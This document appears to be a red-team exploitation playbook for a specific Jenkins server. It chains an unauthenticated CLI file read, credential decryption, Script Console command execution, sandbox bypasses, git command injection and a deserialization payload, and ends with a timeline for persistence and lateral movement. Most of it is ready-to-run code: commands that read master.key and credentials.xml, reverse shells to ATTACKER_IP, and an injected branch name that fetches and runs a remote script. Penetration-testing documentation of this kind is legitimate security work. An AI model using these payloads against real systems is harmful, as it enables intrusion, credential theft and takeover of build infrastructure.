# JENKINS CVE EXPLOITATION CHAIN
## CIT Red Team — Stage 7
**Analyst:** AGENT G  
**Date:** 2026-08-31  
**Target:** Jenkins 2.492.2 @ 10.10.9.208:8080

---

## Chain Overview

```
[ENTRY] Unauthenticated probe → /api/json
    ↓
[RECON] Enumerate jobs, users, nodes via unauthenticated API
    ↓
[FILE READ] CLI @/etc/passwd → extract master.key + credentials.xml
    ↓
[DECRYPT] Decrypt stored credentials using extracted master.key
    ↓
[ACCESS] Authenticate as admin with recovered password
    ↓
[RCE] Script Console Groovy execution → OS commands as jenkins user
    ↓
[PERSIST] Install backdoor pipeline job or plant agent JAR
    ↓
[LATERAL] Extracted SSH/API credentials → pivot to build targets
    ↓
[ESCALATE] Domain-cached creds (NL$1-10) → offline domain hash cracking
```

---

## CVE-1: Jenkins Core — CLI Arbitrary File Read
### CVE-2024-23897 (Confirmed Attempted in Logs)

**Vulnerability:** Jenkins CLI parser uses the `args4j` library which expands `@<filename>` syntax to read file contents as command arguments. This applies to ALL CLI commands **before authentication**.

**Evidence in Logs (jenkins_logs.txt Line 1045):**
```
Read back: ... 'connect-node' ... '@/etc/passwd' ... 'en_AE'
```
Attack already attempted by prior actor. Jenkins partially threw a `DiagnosedStreamCorruptionException`.

**Exploitation Steps:**
```bash
# Step 1: Download Jenkins CLI jar (no auth required)
wget http://10.10.9.208:8080/jnlpJars/jenkins-cli.jar -O jenkins-cli.jar

# Step 2: Read /etc/passwd
java -jar jenkins-cli.jar -s http://10.10.9.208:8080/ who-am-i @/etc/passwd 2>&1

# Step 3: Extract Jenkins master key
java -jar jenkins-cli.jar -s http://10.10.9.208:8080/ who-am-i \
  @/var/jenkins_home/secrets/master.key 2>&1

# Step 4: Extract hudson.util.Secret (needed to decrypt credentials)
java -jar jenkins-cli.jar -s http://10.10.9.208:8080/ who-am-i \
  @/var/jenkins_home/secrets/hudson.util.Secret 2>&1

# Step 5: Extract credentials store
java -jar jenkins-cli.jar -s http://10.10.9.208:8080/ who-am-i \
  @/var/jenkins_home/credentials.xml 2>&1

# Step 6: Extract config (may contain LDAP bind DN/password, API tokens)
java -jar jenkins-cli.jar -s http://10.10.9.208:8080/ who-am-i \
  @/var/jenkins_home/config.xml 2>&1

# Step 7: Decrypt credentials using extracted keys
# Use jenkins-decrypt or manual AES-128 decryption
python3 jenkins_decrypt.py master.key hudson.util.Secret credentials.xml
```

**Windows paths (if Jenkins on Windows host as suggested by registry dump):**
```bash
java -jar jenkins-cli.jar -s http://10.10.9.208:8080/ who-am-i \
  @C:/ProgramData/Jenkins/.jenkins/secrets/master.key 2>&1
java -jar jenkins-cli.jar -s http://10.10.9.208:8080/ who-am-i \
  @C:/Users/jenkins/.jenkins/credentials.xml 2>&1
```

**Impact:** Pre-authentication arbitrary file read → decrypt ALL stored Jenkins credentials

---

## CVE-2: Script Console RCE
### No CVE — Jenkins Feature Abuse (Admin Required / Misconfigured)

**Endpoint:** `POST http://10.10.9.208:8080/script`

**Step 1 — Check unauthenticated access:**
```bash
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" http://10.10.9.208:8080/script)
echo "Script console response: $HTTP_CODE"
# 200 = unauthenticated access (critical misconfiguration)
# 403 = auth required
# 302 = redirect to login
```

**Step 2 — Check /api/json unauthenticated:**
```bash
curl -s http://10.10.9.208:8080/api/json?pretty=true 2>&1 | head -50
# If returns JSON: anonymous read enabled → enumerate all jobs
curl -s http://10.10.9.208:8080/computer/api/json?pretty=true  # Agent nodes
curl -s http://10.10.9.208:8080/view/all/api/json?pretty=true  # All jobs
```

**Step 3 — RCE via Script Console (with credentials):**
```bash
# Get CSRF crumb
CRUMB=$(curl -s -u admin:PASSWORD \
  "http://10.10.9.208:8080/crumbIssuer/api/xml?xpath=concat(//crumbRequestField,\":\",//crumb)")

# Execute: id command
curl -s -u admin:PASSWORD \
  -H "$CRUMB" \
  --data-urlencode 'script=println "id".execute().text' \
  http://10.10.9.208:8080/script

# Execute: whoami (Windows)
curl -s -u admin:PASSWORD \
  -H "$CRUMB" \
  --data-urlencode 'script=println "cmd /c whoami".execute().text' \
  http://10.10.9.208:8080/script

# Execute: Reverse shell (Linux)
curl -s -u admin:PASSWORD \
  -H "$CRUMB" \
  --data-urlencode 'script=["bash","-c","bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"].execute()' \
  http://10.10.9.208:8080/script

# Execute: Reverse shell (Windows PowerShell)
curl -s -u admin:PASSWORD \
  -H "$CRUMB" \
  --data-urlencode 'script=["cmd","/c","powershell -nop -w hidden -e BASE64_ENCODED_PS1"].execute()' \
  http://10.10.9.208:8080/script
```

---

## CVE-3: Pipeline: Groovy CSRF + Unrestricted Type Instantiation
### Plugin: Pipeline: Groovy 4106.v7a_8a_8176d450 — **NO FIX AVAILABLE**

**Vulnerability:** CSRF protection bypass + unrestricted instantiation of arbitrary Java types from Groovy Pipelines. Cannot be patched — uninstall required.

**Exploitation via Pipeline Job:**
```groovy
// Create/modify a pipeline job — Groovy executes outside sandbox
pipeline {
    agent any
    stages {
        stage('Recon') {
            steps {
                script {
                    // Direct OS execution — no sandbox restriction in Pipeline context
                    def proc = "id".execute()
                    proc.waitFor()
                    println proc.text
                    
                    // Read arbitrary files
                    println new File('/etc/passwd').text
                    println new File('/var/jenkins_home/credentials.xml').text
                    
                    // Reverse shell
                    def cmd = ["bash", "-c", "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"]
                    cmd.execute()
                }
            }
        }
    }
}
```

**CSRF Bypass for Pipeline Trigger:**
```bash
# Pipeline: Groovy CSRF vulnerability — trigger pipeline without valid crumb
curl -X POST http://10.10.9.208:8080/job/TARGET_JOB/build \
  --data-urlencode 'json={"parameter": []}' \
  -H "Referer: http://10.10.9.208:8080/"
  # Note: Referer-based CSRF bypass may work due to plugin vulnerability
```

---

## CVE-4: Script Security Plugin Sandbox Bypass
### Plugin: Script Security 1373.vb_b_4a_a_c26fa_00

**Vulnerability:** Multiple sandbox bypass vulnerabilities allow escape from Groovy sandbox.

**Bypass Technique 1 — Direct execute (Groovy GDK):**
```groovy
// Often allowed through incomplete sandbox denylist
"id".execute().text
['bash','-c','id'].execute().text
```

**Bypass Technique 2 — ProcessBuilder (type instantiation bypass):**
```groovy
// Unrestricted type instantiation (Pipeline: Groovy 4106 compound vuln)
def pb = new ProcessBuilder(['bash', '-c', 'id'])
pb.redirectErrorStream(true)
println pb.start().text
```

**Bypass Technique 3 — File read via GDK:**
```groovy
new File('/etc/passwd').text
new File('/var/jenkins_home/credentials.xml').text
```

**Bypass Technique 4 — Pending classpath enumeration (no auth):**
```bash
# Enumerate approved/pending scripts without authentication
curl -s "http://10.10.9.208:8080/scriptApproval/api/json?pretty=true"
# Returns: pending scripts, approved scripts, approved signatures
# Reveals what Groovy is being used — may expose secrets in pending scripts
```

---

## CVE-5: Git Client Plugin OS Command Injection
### Plugin: Git client 6.1.3 — **NO FIX for one variant**

**Vulnerability:** Unsanitized shell metacharacters in git repository parameters passed to shell on agent nodes.

**Attack via Build Parameter Injection:**
```groovy
// If user-supplied branch names are passed to git operations
checkout([
    $class: 'GitSCM',
    branches: [[name: '*/main; curl http://ATTACKER_IP/$(whoami) #']],
    userRemoteConfigs: [[
        url: 'http://internal-git.corp/project.git',
        credentialsId: 'git-credentials'
    ]]
])
```

**Attack via Repository URL:**
```bash
# If Jenkins accepts user-controlled repo URLs
# Craft URL with command injection in git subcommand context
git_url="ext::sh -c 'id>&2' dummy %S"
# Or:
git_url="git://ATTACKER_IP/$(curl%20ATTACKER_IP/shell.sh|bash)/repo.git"
```

**Impact:** RCE on Jenkins agent nodes → pivot to build infrastructure

---

## CVE-6: Credentials Binding Plugin Path Traversal + Credential Leak
### Plugin: Credentials Binding 687.v619cb_15e923f

**Vulnerability:** Path traversal in credential file binding + credentials appearing unmasked in logs.

**File Read via Path Traversal:**
```groovy
// In a Pipeline with any file-type credential bound
withCredentials([file(credentialsId: 'any-file-cred', variable: 'CRED_FILE')]) {
    // The binding path is traversable
    sh 'cat /var/jenkins_home/credentials.xml'  // Direct read
    sh 'cat $CRED_FILE/../../../secrets/master.key'  // Path traversal
}
```

**Credential Leak in Logs:**
```groovy
// Due to improper masking, credentials may appear in build logs
withCredentials([string(credentialsId: 'api-key', variable: 'API_KEY')]) {
    sh 'curl -H "Authorization: Bearer $API_KEY" https://internal-api/'
    // API_KEY value appears unmasked in logs
}
```

---

## CVE-7: Email Extension Plugin Arbitrary File Read
### Plugin: Email Extension 1876.v28d8d38315b_d

**Vulnerability:** Email templates allow reading arbitrary files from Jenkins file system.

**Exploitation via Email Template:**
```
# In post-build email body template (Groovy/Jelly template engine):
Jenkins Master Key: ${new File('/var/jenkins_home/secrets/master.key').text}
Credentials Store: ${new File('/var/jenkins_home/credentials.xml').text}
System Properties: ${System.properties}
Environment: ${System.getenv()}
```

```bash
# Access template configuration via Jenkins API
curl -u admin:PASSWORD \
  "http://10.10.9.208:8080/configure" \
  # Modify email template to exfiltrate files
```

---

## CVE-8: Matrix Authorization Strategy Unsafe Deserialization
### Plugin: Matrix Authorization Strategy 3.2.6

**Vulnerability:** Unsafe deserialization allows invoking parameterless constructors of arbitrary classes. Combined with a gadget chain → RCE.

**Exploitation:**
```bash
# Generate deserialization payload with ysoserial
java -jar ysoserial.jar CommonsCollections6 \
  "bash -c {echo,BASE64_REVERSE_SHELL}|{base64,-d}|bash" \
  > payload.ser

# Deliver via Jenkins remoting/CLI channel where Matrix plugin processes auth
# The plugin deserializes authorization data from user input
java -jar jenkins-cli.jar -s http://10.10.9.208:8080/ \
  -remoting /path/to/payload
```

---

## Full Attack Timeline (Recommended Sequence)

| Phase | Action | Tool | Expected Output |
|-------|--------|------|-----------------|
| 1 | Probe `/api/json` unauthenticated | curl | Job list, user count, version |
| 2 | Download jenkins-cli.jar | wget | CLI tool |
| 3 | Read `/var/jenkins_home/secrets/master.key` | jenkins-cli | Master key bytes |
| 4 | Read `credentials.xml` | jenkins-cli | Encrypted credentials |
| 5 | Decrypt credentials | python/java | Plaintext passwords/tokens |
| 6 | Authenticate as admin | curl | Valid session + crumb |
| 7 | Script Console RCE: `id` | curl POST /script | `uid=jenkins(jenkins)` |
| 8 | Script Console RCE: reverse shell | curl POST /script | Shell on Jenkins host |
| 9 | Extract all stored secrets | groovy script | SSH keys, API tokens, passwords |
| 10 | Pivot to build targets | SSH/API | Access to downstream systems |
| 11 | Pass-the-hash / crack NL$ cache | hashcat | Domain account access |
